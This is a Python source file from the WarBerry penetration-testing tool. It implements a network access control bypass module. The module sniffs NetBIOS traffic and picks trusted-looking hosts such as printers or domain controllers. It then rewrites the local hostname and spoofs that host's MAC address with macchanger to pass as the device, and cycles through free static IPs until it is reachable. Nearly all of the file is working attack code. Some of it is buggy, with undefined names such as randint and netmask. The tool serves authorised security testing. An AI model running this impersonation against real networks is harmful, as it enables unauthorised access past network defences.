"""
This file is part of the WarBerry tool.
Copyright (c) 2016 Yiannis Ioannides (@sec_groundzero).
https://github.com/secgroundzero/warberry
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
"""

import os, os.path
import subprocess
from src.utils import *
from src.utils.console_colors import *



def nacbypass(unique_CIDR, ifname):

	print bcolors.OKGREEN + "      [ NAC FILTERING BYPASS MODULE ]\n" + bcolors.ENDC

	print "Scanning Network for Hostnames\n"

	goodwords = ['PRINTER', 'DEMO', 'DEV', 'DC', 'DC1', 'DC2']

	subprocess.call("sudo tcpdump -i %s -vvv port 137 -c 10 > ../Results/network_traffic"%ifname,shell=True);
	search = ".netbios"
	subprocess.call("grep %s ../Results/network_traffic > ../Results/ips_found" %search, shell=True)
	ip_net = []
	with open('../Results/ips_found', 'r') as a:
		ips = a.readlines()
		for line in ips:
			ip_net.append(line.split('n')[0].strip()[:-1])

	search = "Name="
	subprocess.call("grep %s ../Results/network_traffic > ../Results/names_found " %search, shell=True)
	n = []
	with open('../Results/names_found', 'r') as a:
		names = a.readlines()
		for line in names:
			n.append(line.split(' ')[0].split('=')[1])

	names = []
	for i in range(len(n)):
		if (i % 2 == 0):
			names.append(n[i])

	subprocess.call("sudo netdiscover -P -r %s | awk {'print $1,$2'} > ../Results/ips_macs" % unique_CIDR,shell=True)

	if os.path.isfile('../Results/ips_macs'):
		with open('../Results/ips_macs', 'r') as ip_m:
			ip_mac = ip_m.readlines()
			macs = [None] * len(ip_net)
			for line in ip_mac:
				found = False
				for i in range(len(ip_net)):
					if (line.split(' ')[0] == ip_net[i]):
						found = True
						macs[i] = line.split(' ')[1]
					else:
						found = False
						macs[i] = '-'

			Fname = []
			Fmac = []

			for i in range(len(macs)):
				if (macs[i] != "-"):
					Fname.append(names[i])
					Fmac.append(macs[i])

			for word in goodwords:
				for name in Fname:
					if word == name:
						ic = Fname.index(name)
						print "Changing hostname to %s and MAC address to %s" % (name, Fmac[ic])
					with open('/etc/hosts', 'w') as hosts:
						hosts.write('127.0.0.1\tlocalhost\n::1\tlocahost ip6-localhost ip6-loopback\nff02::1\tip6-allnodes\nff02::2\tip6-allrouters\n\n127.0.1\t%s' % name)
					with open('/etc/hostname', 'w') as hostname:
						hostname.write(name)
						subprocess.call('sudo /etc/init.d/hostname.sh', shell=True)
						subprocess.call('sudo systemctl daemon-reload', shell=True)
					subprocess.call('sudo ifdown %s'%ifname, shell=True)
					subprocess.call('sudo macchanger -m %s %s' %(Fmac[ic], ifname), shell=True)
					subprocess.call('sudo ifup %s'%ifname, shell=True)

		with open('../Results/used_ips', 'r') as used:
			used_ips = used.readlines()
			with open('../Results/statics', 'w') as statics:
				with open('../Results/avail_ips', 'r') as avail_ips:
					for available in avail_ips:
						isUsed = False
						for used in used_ips:
							if ((available.strip() == used.strip()) and (isUsed == False)):
								print bcolors.FAIL + "[-] IP %s is in use, excluding from static list" % used.strip() + bcolors.ENDC
								isUsed = True
							if isUsed==False:
								statics.write(available)

					with open('../Results/statics') as static:
						total_frees = sum(1 for _ in static)
						if total_frees > 0:
							print bcolors.TITLE + '\n%s Available IPs to choose from.' % total_frees + bcolors.ENDC
						else:
							print bcolors.FAIL + "No free IPs Found\n" + bcolors.ENDC

		with open('../Results/statics', 'r') as statics:
			line_count = (sum(1 for _ in statics))
			for i in range(0, line_count):
				newline = randint(0, line_count)

				static = linecache.getline('../Results/statics', newline)
				print bcolors.WARNING + "[*] Attempting to set random static ip %s" % static.strip() + bcolors.ENDC
				subprocess.call(["ifconfig", ifname, static.strip(), "netmask", netmask.strip()])

		for used in reversed(open('../Results/used_ips').readlines()):
			print "[*] Pinging %s to ensure that we are live..." % used.strip()
			ping_response = subprocess.call(['ping', '-c', '5', '-W', '3', used.strip()], stdout=open(os.devnull, 'w'),stderr=open(os.devnull, 'w'))

			if ping_response == 0:
				print bcolors.OKGREEN + "[+] Success. IP %s is valid and %s is reachable" % (static.strip(), used.strip()) + bcolors.ENDC
				return static.strip()

	else:
		print bcolors.FAIL + "Unable to bypass. Exiting."
		exit()
